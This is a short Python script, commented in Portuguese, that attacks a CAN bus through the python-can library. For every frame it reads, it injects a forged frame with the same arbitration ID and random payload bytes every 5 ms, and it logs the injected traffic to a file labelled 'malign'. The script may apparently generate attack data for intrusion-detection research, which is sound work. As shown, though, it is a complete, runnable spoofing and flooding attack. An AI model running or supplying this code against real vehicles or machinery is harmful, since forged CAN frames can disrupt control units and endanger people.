import can
import time
import random
import datetime
import logging

logging.basicConfig(filename=f"bus(malign)-{datetime.datetime.now()}.log", level=logging.INFO, format='%(message)s')

def createLogLine(msg):
    payload = "".join(["{:02X}".format(byte) for byte in msg.data])
    logging.info(f'({msg.timestamp}) {msg.channel} {hex(msg.arbitration_id)}#{payload}')

# Configuração da interface CAN (can0 = exemplo)
bus = can.interface.Bus(channel='can0', bustype='socketcan')

try:
    while True:
        for msg in bus: 
            spoofed_id = msg.arbitration_id
            message = can.Message(arbitration_id=spoofed_id, data = [random.randint(0, 255) for _ in range(8)], is_extended_id=False)
            # Envie a mensagem fabricada para o barramento CAN
            bus.send(message)
            createLogLine(message)
        
            time.sleep(0.005)  # Intervalo entre cada mensagem (em segundos)


except KeyboardInterrupt:
    pass

# Limpeza da interface CAN
bus.shutdown()
